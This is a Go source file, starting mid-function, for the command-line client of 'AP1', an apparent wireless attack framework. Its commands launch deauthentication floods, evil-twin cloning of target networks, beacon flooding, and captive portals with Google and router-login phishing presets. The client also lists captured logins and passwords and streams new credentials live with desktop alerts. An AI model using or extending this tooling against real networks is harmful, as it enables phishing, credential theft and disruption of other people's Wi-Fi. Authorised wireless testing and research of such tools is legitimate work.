		b, err := post("/api/plugins/toggle", body)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
		return
	case "start":
		if len(args) < 3 {
			fmt.Println("plugins: usage: plugins start <name> <cmd> [args...]")
			return
		}
		name := args[1]
		cmdStr := args[2]
		cmdArgs := args[3:]
		payload := map[string]interface{}{"name": name, "cmd": cmdStr, "args": cmdArgs}
		data, err := json.Marshal(payload)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		b, err := post("/api/plugins/start", strings.NewReader(string(data)))
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
		return
	case "stop":
		if len(args) != 2 {
			fmt.Println("plugins: usage: plugins stop <name>")
			return
		}
		name := args[1]
		payload := map[string]interface{}{"name": name}
		data, err := json.Marshal(payload)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		b, err := post("/api/plugins/stop", strings.NewReader(string(data)))
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
		return
	default:
		fmt.Println("plugins: usage: plugins [list] | toggle <name> <on|off> | start <name> <cmd> [args...] | stop <name>")
	}
}

func cmdInterfaces(args []string) {
	if len(args) == 0 || args[0] == "list" {
		b, err := get("/api/interfaces")
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		var interfaces []map[string]interface{}
		if err := json.Unmarshal(b, &interfaces); err != nil {
			printResponse(b)
			return
		}
		rows := [][]string{}
		for _, iface := range interfaces {
			rows = append(rows, []string{
				fmt.Sprint(iface["name"]),
				fmt.Sprint(iface["mac"]),
				fmt.Sprint(iface["state"]),
			})
		}
		printTable([]string{"NAME", "MAC", "STATE"}, rows)
		return
	}
	fmt.Println("interfaces: usage: interfaces [list]")
}

func cmdRecon(args []string) {
	iface := "wlan0"
	if len(args) == 2 && args[0] == "scan" {
		iface = args[1]
	} else if len(args) != 0 {
		fmt.Println("recon: usage: recon scan [iface]")
		return
	}

	b, err := get(fmt.Sprintf("/api/recon/networks?iface=%s", iface))
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	printResponse(b)
}

func cmdPortal(args []string) {
	if len(args) == 0 || args[0] == "status" {
		printSection("Portal Status")
		b, err := get("/api/portal/status")
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		var status map[string]interface{}
		if err := json.Unmarshal(b, &status); err != nil {
			printResponse(b)
			return
		}
		printKeyValues(status)
		return
	}
	if args[0] == "credentials" {
		b, err := get("/api/portal/credentials")
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		var creds []map[string]interface{}
		if err := json.Unmarshal(b, &creds); err != nil {
			printResponse(b)
			return
		}
		rows := [][]string{}
		for _, cred := range creds {
			rows = append(rows, []string{
				fmt.Sprint(cred["login"]),
				fmt.Sprint(cred["password"]),
				fmt.Sprint(cred["ip"]),
				fmt.Sprint(cred["timestamp"]),
			})
		}
		printTable([]string{"LOGIN", "PASSWORD", "IP", "TIMESTAMP"}, rows)
		return
	}
	if args[0] == "start" {
		b, err := post("/api/portal/start", nil)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
		return
	}
	if args[0] == "stop" {
		b, err := post("/api/portal/stop", nil)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
		return
	}
	fmt.Println("portal: usage: portal [status|credentials|start|stop]")
}

func cmdSystem(args []string) {
	if len(args) < 2 {
		fmt.Println("system: usage: system <service> <start|stop|restart|status>")
		return
	}
	service := args[0]
	action := args[1]
	printSection(fmt.Sprintf("System: %s %s", strings.Title(service), strings.Title(action)))
	b, err := post(fmt.Sprintf("/api/system/%s/%s", service, action), nil)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	printResponse(b)
}

func cmdFirewall(args []string) {
	if len(args) == 0 {
		fmt.Println("firewall: usage: firewall apply [iface] [portal_ip] | clear [iface]")
		return
	}
	switch args[0] {
	case "apply":
		iface := "wlan0"
		portalIP := "192.168.50.1"
		if len(args) >= 2 {
			iface = args[1]
		}
		if len(args) >= 3 {
			portalIP = args[2]
		}
		payload := fmt.Sprintf(`{"interface":"%s","portal_ip":"%s"}`, iface, portalIP)
		b, err := post("/api/system/firewall/apply", strings.NewReader(payload))
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
	case "clear":
		iface := "wlan0"
		if len(args) >= 2 {
			iface = args[1]
		}
		payload := fmt.Sprintf(`{"interface":"%s"}`, iface)
		b, err := post("/api/system/firewall/clear", strings.NewReader(payload))
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
	default:
		fmt.Println("firewall: usage: firewall apply [iface] [portal_ip] | clear [iface]")
	}
}

func cmdInterface(args []string) {
	if len(args) != 4 {
		fmt.Println("interface: usage: interface configure <iface> <ip> <subnet>")
		return
	}
	if args[0] != "configure" {
		fmt.Println("interface: usage: interface configure <iface> <ip> <subnet>")
		return
	}
	iface := args[1]
	ip := args[2]
	subnet := args[3]
	payload := fmt.Sprintf(`{"interface":"%s","ip":"%s","subnet":"%s"}`, iface, ip, subnet)
	b, err := post("/api/system/interface/configure", strings.NewReader(payload))
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	printResponse(b)
}

func cmdTemplates(args []string) {
	// list local templates
	if len(args) == 0 || args[0] == "list" {
		// try several likely locations relative to execution CWD
		candidates := []string{"../config/templates", "./config/templates", "config/templates"}
		var dir string
		for _, c := range candidates {
			if info, err := os.Stat(c); err == nil && info.IsDir() {
				dir = c
				break
			}
		}
		if dir == "" {
			fmt.Fprintln(os.Stderr, "error: config/templates not found in expected locations")
			os.Exit(1)
		}
		files, err := os.ReadDir(dir)
		if err != nil {
			fmt.Fprintln(os.Stderr, "error:", err)
			os.Exit(1)
		}
		for _, f := range files {
			if f.IsDir() {
				fmt.Println(f.Name())
			}
		}
		return
	}

	// import templates from a source templates directory
	if args[0] == "import" && len(args) > 1 {
		srcBase := args[1]
		dstBase := "../config/templates"
		entries, err := os.ReadDir(srcBase)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		for _, e := range entries {
			src := srcBase + "/" + e.Name()
			dst := dstBase + "/" + e.Name()
			// copy recursively for directories
			if e.IsDir() {
				err := copyDir(src, dst)
				if err != nil {
					fmt.Fprintln(os.Stderr, err)
					os.Exit(1)
				}
				fmt.Println("imported:", e.Name())
			}
		}
		return
	}

	fmt.Println("templates: usage: templates [list] | import <source_templates_dir>")
}

// copyDir copies a directory recursively
func copyDir(src string, dst string) error {
	infos, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dst, 0o755); err != nil {
		return err
	}
	for _, info := range infos {
		srcPath := src + "/" + info.Name()
		dstPath := dst + "/" + info.Name()
		if info.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			if err := copyFile(srcPath, dstPath); err != nil {
				return err
			}
		}
	}
	return nil
}

func copyFile(src, dst string) error {
	r, err := os.Open(src)
	if err != nil {
		return err
	}
	defer r.Close()
	w, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer w.Close()
	_, err = io.Copy(w, r)
	return err
}

var banners = []string{
	`
              .........
            .'------.' |       Plug and Play
           | .-----. | |
           | |     | | |
         __| |     | | |;. _______________
        /  |*` + "`" + `-----'.|.' ` + "`" + `;              //
       /   ` + "`" + `---------' .;'              //
 /|   /  .''''////////;'               //
|=|  .../ ######### /;/               //|
|/  /  / ######### //                //||
   /   ` + "`" + `-----------'                // ||
  /________________________________//| ||
  ` + "`" + `--------------------------------' | ||
   : | ||      | || |__LL__|| ||     | ||
   : | ||      | ||         | ||     ` + "`" + `""'
   n | ||      ` + "`" + `""'         | ||
   M | ||                   | ||
     | ||                   | ||
     ` + "`" + `""'                   ` + "`" + `""'
`,
	`
                                         .
                                          `.

                                     ...
                                        `.
                                  ..
                                    `.
                            `.        `.
                         ___` + "`" + `.\.//
                            ` + "`" + `---.---
                           /     \.--
                          /       \-
                         |   /\    \
                         |\==/\==/  |
                         | ` + "`" + `@'` + "`" + `@'  .--.
                  .--------.           )
                .'             .   ` + "`" + `._/
               /               |     \
              .               /       |
              |              /        |
              |            .'         |   .--.
             .'`.        .'_          |  /    \
           .'    ` + "`" + `.__.--'.--` + "`" + `.       / .'      |
         .'            .|    \\     |_/        |
       .'            .' |     \\               |
     .-` + "`" + `.           /   |      .      __       |
   .'    `.     \   |   ` + "`" + `           .'  )      \
  /        \   / \  |            .-'   /       |
 (  /       \ /   \ |                 |        |
  \/         (     \/                 |        |
  (  /        )    /                 /   _.----|
   \/   //   /   .'                  |.-'       ` + "`" + `
   (   /(   /   /                    /      `.   |
    ` + "`" + `.(  `-')  .---.                |    `.   ` + "`" + `._/
       ` + "`" + `._.'  /     `.   .---.      |  .   ` + "`" + `._.'
              |       \ /     `.     \  ` + "`" + `.___.'
              |        Y        `.    ` + "`" + `.___.'
              |      . |          \         \
              |       ` + "`" + `|           \         |
              |        |       .    \        |
              |        |        \    \       |
            .--.       |         \           |
           /    `.  .----.        \          /
          /       \/      \        \        /
          |       |        \       |       /
           \      |    @    \   `-. \     /
            \      \         \     \|.__.'
             \      \         \     |
              \      \         \    |
               \      \         \   |
                \    .'`.        \  |
                 `.-'    `.    _.'\ |
                   |       `.-'    ||
              .     \     . `.     ||      .'
               `.    `-.-'    `.__.'     .'
                 `.                    .'
             .                       .'
              `.
                                           .-'
                                        .-'
`,
	`
      \                 \
       \         ..      \
        \       /  `-.--.___ __.-.___
` + "`" + `-.      \     /  #   `-._.-'    \   ` + "`" + `--.__
   ` + "`" + `-.        /  ####    /   ###  \        `.
________     /  #### ############  |       _|           .'
            |\ #### ##############  \__.--' |    /    .'
            | ####################  |       |   /   .'
            | #### ###############  |       |  /
            | #### ###############  |      /|      ----
          . | #### ###############  |    .'<    ____
        .'  | ####################  | _.'-'\|
      .'    |   ##################  |       |
             `.   ################  |       |
               `.    ############   |       | ----
              ___`.     #####     _..____.-'     .
             |` + "`" + `-._ ` + "`" + `-._       _.-'    \\\         `.
          .'` + "`" + `-._  ` + "`" + `-._ ` + "`" + `-._.-'` + "`" + `--.___.-' \          `.
        .' .. . ` + "`" + `-._  ` + "`" + `-._        ___.---'|   \   \
      .' .. . .. .  ` + "`" + `-._  ` + "`" + `-.__.-'        |    \   \
     |` + "`" + `-. . ..  . .. .  ` + "`" + `-._|             |     \   \
     |   ` + "`" + `-._ . ..  . ..   .'            _|
      ` + "`" + `-._   ` + "`" + `-._ . ..   .' |      __.--'
          ` + "`" + `-._   ` + "`" + `-._  .' .'|__.--'
              ` + "`" + `-._   ` + "`" + `' .'
                  ` + "`" + `-._.'
`,
}

var startBanners = []string{
	`
#  .+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.
# (        _           ____         _       )
#  )      / \         |  _ \       / |     (
# (      / _ \        | |_) |      | |      )
#  )    / ___ \       |  __/       | |     (
# (    /_/   \_\      |_|          |_|      )
#  )                                       (
# (                                         )
#  "+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"
`,
}

var interactiveBanners = []string{
	`
                     ,---.           ,---.
                    / /"` + "`" + `.\.--"""--./,'"\ \
                    \ \    _       _    / /
                     ` + "`" + `./  / __   __ \  \,'
                      /    /_O)_(_O\    \
                      |  .-'  ___  ` + "`" + `-.  |
                   .--|       \_/       |--.
                 ,'    \   \   |   /   /    `.
                /       `.  ` + "`" + `--^--'  ,'       \
             .-"""""-.    ` + "`" + `--.___.--'     .-"""""-.
.-----------/         \------------------/         \--------------.
| .---------\         /----------------- \         /------------. |
| |          ` + "`" + `-` + "`" + `--` + "`" + `--'                    ` + "`" + `--'--'-'             | |
| |                                                             | |
| |        WELCOME TO AP1 INTERACTIVE CONSOLE                   | |
| |_____________________________________________________________| |
|_________________________________________________________________|
                   )__________|__|__________(
                  |            ||            |
                  |____________||____________|
                    ),-----.(      ),-----.(
                  ,'   ==.   \    /  .==    `.
                 /            )  (            \
                 ` + "`" + `==========='    ` + "`" + `==========='
`,
}

var bannerTaglines = []string{
	"edge-aware captive portal orchestrator",
	"network trickery with a friendly face",
	"AP management for modern pentesting",
	"control APs, portals and payloads",
}

func showBanner(mode string) {
	var banner string
	switch mode {
	case "start":
		banner = randomStartBanner()
	case "interactive":
		banner = randomInteractiveBanner()
	default:
		banner = randomBanner()
	}

	// Animation effect: Typewriter/Fade-in
	lines := strings.Split(banner, "\n")
	for _, line := range lines {
		fmt.Println(colorText(ansiCyan, line))
		time.Sleep(20 * time.Millisecond)
	}

	var tagline string
	if mode == "start" {
		tagline = "starting AP1..."
	} else if mode == "interactive" {
		tagline = "interactive AP1 console"
	} else {
		tagline = randomTagline()
	}
	printWithBorder("AP1 - " + tagline)
	fmt.Println()
}

func cmdExit() {
	fmt.Println()
	fmt.Println(colorText(ansiYellow, "[!] Exiting AP1 CLI..."))

	// Closing animation
	chars := []string{"|", "/", "-", "\\"}
	for i := 0; i < 10; i++ {
		fmt.Printf("\r%s Cleaning up session... %s", colorText(ansiCyan, chars[i%len(chars)]), colorText(ansiCyan, chars[i%len(chars)]))
		time.Sleep(100 * time.Millisecond)
	}
	fmt.Println("\r" + colorText(ansiGreen, "[+] Session closed. Happy hunting!"))
	fmt.Println()
	os.Exit(0)
}

func usage() {
	showBanner("")
	printSection("Available Commands")
	fmt.Println()

	printSection("Core Commands")
	fmt.Printf("%-12s %s\n", "Command", "Description")
	fmt.Printf("%-12s %s\n", "-------", "-----------")
	printCmd("banner", "display an awesome AP1 banner")
	printCmd("clear", "clear the terminal and show a new banner")
	printCmd("exit", "exit program and all threads")
	printCmd("help", "show this help")
	printCmd("ignore", "the message logger will be ignored")
	printCmd("info", "get information about proxy/plugin settings")
	printCmd("jobs", "show all threads/processes in background")
	printCmd("search", "search modules by name")
	printCmd("set", "set variable proxy,plugin and access point")
	printCmd("presets", "apply a predefined attack scenario")
	printCmd("show", "show available modules")
	printCmd("unset", "unset variable command")
	printCmd("use", "select module for modules")
	printCmd("status", "show API/core status")
	fmt.Println()

	printSection("Ap Commands")
	fmt.Printf("%-12s %s\n", "Command", "Description")
	fmt.Printf("%-12s %s\n", "-------", "-----------")
	printCmd("ap", "show all variable and status from AP")
	printCmd("clients", "show all connected clients on AP")
	printCmd("dhcpconf", "show/choice dhcp server configuration")
	printCmd("dhcpmode", "show/set all available dhcp server")
	printCmd("dump", "dump informations from client connected on AP")
	printCmd("start", "start access point service")
	printCmd("stop", "stop access point service")
	printCmd("profiles", "manage AP profiles (list, select, create, delete)")
	fmt.Println()

	printSection("Network Commands")
	fmt.Printf("%-12s %s\n", "Command", "Description")
	fmt.Printf("%-12s %s\n", "-------", "-----------")
	printCmd("plugins", "show all available plugins")
	printCmd("proxies", "show all available proxies")
	printCmd("deauth", "perform deauthentication attack")
	printCmd("eviltwin", "automatic evil twin attack (scan & clone)")
	printCmd("beacon", "beacon flooding attack (create fake SSIDs)")
	printCmd("monitor", "real-time credential monitoring")
	printCmd("recon", "scan for wireless networks")
	printCmd("logs", "stream live logs from all services")
	printCmd("firewall", "manage firewall rules")
	printCmd("portal", "manage captive portal")
	printCmd("interface", "configure network interfaces")
	fmt.Println()

	printSection("Presets")
	fmt.Println("  open_nav      - Open AP with real internet and sniffing")
	fmt.Println("  google_phish  - AP with Google phishing template")
	fmt.Println("  router_attack - AP with Router Login template")
	fmt.Println()

	printSection("Environment")
	fmt.Println("  AP1_API_URL                 API server URL")
	fmt.Println("  AP1_API_TOKEN               API authentication token")
	fmt.Println("  AP1_USE_DOCKER              Use docker compose exec for requests")
}

func printCmd(cmd, desc string) {
	fmt.Printf("%-12s %s\n", cmd, desc)
}

func cmdDeauth(args []string) {
	if len(args) < 2 {
		fmt.Println("deauth: usage: deauth <interface> <bssid> [client_mac] [count]")
		return
	}
	iface := args[0]
	bssid := args[1]
	payload := map[string]interface{}{
		"interface": iface,
		"bssid":     bssid,
	}
	if len(args) >= 3 {
		payload["client"] = args[2]
	}
	if len(args) >= 4 {
		count, err := strconv.Atoi(args[3])
		if err == nil {
			payload["count"] = count
		}
	}

	data, _ := json.Marshal(payload)
	b, err := post("/api/deauth/start", bytes.NewReader(data))
	if err != nil {
		fmt.Fprintln(os.Stderr, "deauth failed:", err)
		return
	}
	printResponse(b)
}

func cmdEvilTwin(args []string) {
	if len(args) < 2 {
		fmt.Println("eviltwin: usage: eviltwin <interface> <target_ssid>")
		return
	}
	iface := args[0]
	ssid := args[1]
	payload := map[string]interface{}{
		"interface": iface,
		"ssid":      ssid,
	}
	data, _ := json.Marshal(payload)
	b, err := post("/api/eviltwin/start", bytes.NewReader(data))
	if err != nil {
		fmt.Fprintln(os.Stderr, "evil twin failed:", err)
		return
	}
	printResponse(b)
}

func cmdBeacon(args []string) {
	if len(args) < 2 {
		fmt.Println("beacon: usage: beacon <interface> <ssid1> [ssid2...]")
		fmt.Println("        beacon stop")
		return
	}

	if args[0] == "stop" {
		b, err := post("/api/beacon/stop", nil)
		if err != nil {
			fmt.Fprintln(os.Stderr, "beacon stop failed:", err)
			return
		}
		printResponse(b)
		return
	}

	iface := args[0]
	ssids := args[1:]
	payload := map[string]interface{}{
		"interface": iface,
		"ssids":     ssids,
	}
	data, _ := json.Marshal(payload)
	b, err := post("/api/beacon/start", bytes.NewReader(data))
	if err != nil {
		fmt.Fprintln(os.Stderr, "beacon flood failed:", err)
		return
	}
	printResponse(b)
}

func cmdMonitor(args []string) {
	printSection("Live Credential Monitor")
	fmt.Println("Press Ctrl+C to exit monitor mode")
	fmt.Println(strings.Repeat("-", 40))

	wsURL := strings.Replace(apiBase, "http", "ws", 1) + "/ws/credentials"
	c, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
	if err != nil {
		fmt.Fprintln(os.Stderr, "dial error:", err)
		return
	}
	defer c.Close()

	for {
		_, message, err := c.ReadMessage()
		if err != nil {
			fmt.Fprintln(os.Stderr, "read error:", err)
			return
		}
		fmt.Printf("[%s] %s\n", colorText(ansiGreen, "NEW CREDENTIAL"), string(message))
		sendNotification("Credential Captured!", string(message))
	}
}

func sendNotification(title, message string) {
	// 1. Terminal Alert
	fmt.Printf("\n%s %s\n", colorText(ansiRed+ansiBold, "[ALERT]"), colorText(ansiBold, title))
	fmt.Printf("%s %s\n\n", colorText(ansiRed, ">>>"), message)

	// 2. System Notification (Linux)
	exec.Command("notify-send", "-i", "network-wireless", title, message).Run()
}

func cmdLogs(args []string) {
	printSection("Live Logs")
	fmt.Println("Streaming logs from all services... (Ctrl+C to stop)")
	fmt.Println(strings.Repeat("-", 60))

	logFiles := []string{
		"../system/runtime/logs/dnsmasq.log",
		"../system/runtime/logs/hostapd.log",
		"../system/runtime/portal_credentials.log",
	}

	// Simple multi-tail implementation
	for {
		for _, file := range logFiles {
			data, err := os.ReadFile(file)
			if err != nil {
				continue
			}
			lines := strings.Split(string(data), "\n")
			if len(lines) > 5 {
				lines = lines[len(lines)-6:]
			}
			for _, line := range lines {
				if strings.TrimSpace(line) == "" {
					continue
				}
				prefix := ""
				color := ansiCyan
				if strings.Contains(file, "dnsmasq") {
					prefix = "[DNS/DHCP] "
					color = ansiYellow
				} else if strings.Contains(file, "hostapd") {
					prefix = "[WIFI] "
					color = ansiCyan
				} else {
					prefix = "[PORTAL] "
					color = ansiGreen
				}
				fmt.Println(colorText(color, prefix) + line)
			}
		}
		time.Sleep(2 * time.Second)
	}
}

func runScript(path string) {
	fmt.Println(colorText(ansiYellow, "[*] Running script: "+path))
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error reading script: %v\n", err)
		return
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		fmt.Println(colorText(ansiCyan, "ap1 > "+line))
		parts := strings.Fields(line)
		handleGlobalCommand(parts[0], parts[1:])
	}
}

// Factor out command handling for script/repl/main
func handleGlobalCommand(cmd string, args []string) {
	switch cmd {
	case "exit", "quit":
		cmdExit()
	case "status":
		cmdStatus()
	case "health":
		cmdHealth()
	case "config":
		cmdConfig()
	case "start":
		cmdStart(args)
	case "stop":
		cmdStop(args)
	case "clients":
		cmdClients(args)
	case "ap":
		cmdAP(args)
	case "set":
		cmdSet(args)
	case "presets":
		cmdPresets(args)
	case "unset":
		cmdUnset(args)
	case "ignore":
		cmdIgnore(args)
	case "restore":
		cmdRestore(args)
	case "info":
		cmdInfo(args)
	case "jobs":
		cmdJobs(args)
	case "mode":
		cmdMode(args)
	case "plugins":
		cmdPlugins(args)
	case "proxies":
		cmdProxies(args)
	case "show":
		cmdShow(args)
	case "search":
		cmdSearch(args)
	case "use":
		cmdUse(args)
	case "dump":
		cmdDump(args)
	case "dhcpconf":
		cmdDhcpconf(args)
	case "dhcpmode":
		cmdDhcpmode(args)
	case "update":
		cmdUpdate(args)
	case "banner":
		cmdBanner(args)
	case "clear":
		cmdClear(args)
	case "interfaces":
		cmdInterfaces(args)
	case "recon":
		cmdRecon(args)
	case "portal":
		cmdPortal(args)
	case "firewall":
		cmdFirewall(args)
	case "interface":
		cmdInterface(args)
	case "system":
		cmdSystem(args)
	case "deauth":
		cmdDeauth(args)
	case "eviltwin":
		cmdEvilTwin(args)
	case "beacon":
		cmdBeacon(args)
	case "monitor":
		cmdMonitor(args)
	case "logs":
		cmdLogs(args)
	case "tui":
		if err := startTUI(); err != nil {
			fmt.Fprintln(os.Stderr, "tui error:", err)
			os.Exit(1)
		}
	case "templates":
		cmdTemplates(args)
	case "version":
		cmdVersion()
	case "interactive":
		showBanner("interactive")
		startREPL()
	case "help":
		usage()
	default:
		fmt.Fprintf(os.Stderr, "Unknown command: %s\n", cmd)
	}
}

func main() {
	var dockerFlag bool
	var apiURL string
	var scriptPath string
	flag.BoolVar(&dockerFlag, "docker", false, "Use docker compose exec to reach services")
	flag.StringVar(&apiURL, "api", "", "URL of the AP1 API server")
	flag.StringVar(&scriptPath, "run", "", "Path to a script file to execute")
	flag.Usage = usage
	flag.Parse()

	if scriptPath != "" {
		runScript(scriptPath)
		return
	}

	if apiURL != "" {
		apiBase = apiURL
	} else if envURL := os.Getenv("AP1_API_URL"); envURL != "" {
		apiBase = envURL
	}
	dockerMode = dockerFlag || (isDockerComposeAvailable() && os.Getenv("AP1_USE_DOCKER") == "1")

	cmd := flag.Arg(0)
	if cmd == "" {
		usage()
		os.Exit(0)
	}

	if os.Geteuid() != 0 && cmd != "help" && cmd != "version" && cmd != "banner" {
		fmt.Fprintln(os.Stderr, "ERROR: AP1 CLI must be run as root.")
		fmt.Fprintln(os.Stderr, "Please run with sudo: sudo ap1-cli <command>")
		os.Exit(1)
	}

	args := flag.Args()[1:]
	handleGlobalCommand(cmd, args)
}
